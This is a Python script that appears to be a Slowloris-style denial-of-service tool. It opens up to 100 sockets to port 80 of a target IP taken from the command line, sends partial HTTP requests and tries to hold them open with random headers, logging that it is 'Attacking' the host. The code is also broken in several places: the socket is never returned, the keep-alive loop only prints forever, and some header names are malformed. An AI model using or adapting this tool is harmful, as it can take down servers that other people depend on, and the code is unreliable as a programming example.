import random
import socket
import sys
import time

# constants
log_level = 2
socket_count = 100

# socket list
list_of_sockets = []

# header
regular_headers = [
    "User agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept Language: en-US,en;q=0.5",
]


def log(text, level=1):
    if log_level >= level:
        print(text)


def socketCreation(ip, port, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, 80))


def sendingPersistantHeaders(sleep_time):
    while True:
        log("Sending keep_alive headers...")
    for s in list_of_sockets:
        log("Sending headers...", level=2)
        try:
            s.send(bytes("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")))
        except socket.error:
            list_of_sockets.remove(s)
            try:
                socketCreation(ip=ip, port=80, timeout=4)
                for s in list_of_sockets:
                    s.send("GET /?{} HTTP/1.1".format(random.randint(0, 2000)).encode("utf-8"))
                    for header in regular_headers:
                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            except socket.error:
                continue

        time.sleep(sleep_time)


def main(ip):
    log("Attacking {} with {} sockets...".format(ip, socket_count))
    log("Creating sockets...")
    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)

            socketCreation(ip=ip, port=80, timeout=4)
        except socket.error:
            break
        list_of_sockets.append(s)
    log("Setting up sockets....")
    for s in list_of_sockets:
        s.send("GET /?{} HTTP/1.1".format(random.randint(0, 2000)).encode("utf-8"))
        for header in regular_headers:
            s.send(bytes("{}\r\n".format(header).encode("utf-8")))


if __name__ == '__main__':
    ip = sys.argv[1]
    main(ip)
    sendingPersistantHeaders(sleep_time = 5)
